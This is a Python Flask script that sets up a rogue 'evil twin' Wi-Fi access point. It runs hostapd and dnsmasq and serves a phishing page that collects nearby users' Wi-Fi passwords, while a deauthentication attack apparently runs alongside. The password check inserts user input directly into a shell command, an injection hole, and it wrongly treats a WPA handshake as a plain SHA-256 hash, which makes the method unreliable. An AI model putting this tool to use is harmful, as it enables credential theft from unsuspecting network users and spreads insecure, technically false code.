import os
import subprocess
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

EVIL_SSID = "FreeWiFi"
HANDSHAKE_FILE = "../scripts/capture/handshake.txt"
PASSWORD_FILE = "../scripts/capture/wifi_password.txt"
HOSTAPD_CONFIG = "/tmp/hostapd.conf"

def start_evil_twin(ssid):
    """Starts an Evil Twin AP using hostapd."""
    print(f"[*] Starting Evil Twin: {ssid}")

    config = f"""
interface=wlan0
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
wpa=2
wpa_passphrase=12345678
"""

    with open(HOSTAPD_CONFIG, "w") as file:
        file.write(config)

    os.system("sudo systemctl stop hostapd dnsmasq")
    os.system(f"sudo hostapd {HOSTAPD_CONFIG} &")
    os.system("sudo dnsmasq -C /etc/dnsmasq.conf &")

@app.route('/capture_password', methods=['POST'])
def capture_password():
    password = request.form.get("password")
    if validate_password(password):
        return "<h2>Correct password! Attack stopped.</h2>"
    return "<h2>Incorrect password. Try again.</h2>"

def validate_password(password):
    """Validates entered password against the WPA handshake."""
    if not os.path.exists(HANDSHAKE_FILE):
        return False

    with open(HANDSHAKE_FILE, "r") as file:
        handshake_hash = file.read().strip()

    entered_hash = subprocess.getoutput(f"echo -n {password} | sha256sum").split()[0]
    
    if entered_hash == handshake_hash:
        with open(PASSWORD_FILE, "w") as file:
            file.write(password)

        stop_attacks()
        return True
    return False

def stop_attacks():
    """Stops Evil Twin and Deauth Attack."""
    os.system("sudo pkill hostapd")
    os.system("sudo pkill dnsmasq")
    os.system("sudo pkill aireplay-ng")
    print("[+] Evil Twin and Deauth Attack Stopped!")

if __name__ == "__main__":
    start_evil_twin(EVIL_SSID)
    app.run(host="0.0.0.0", port=8080)
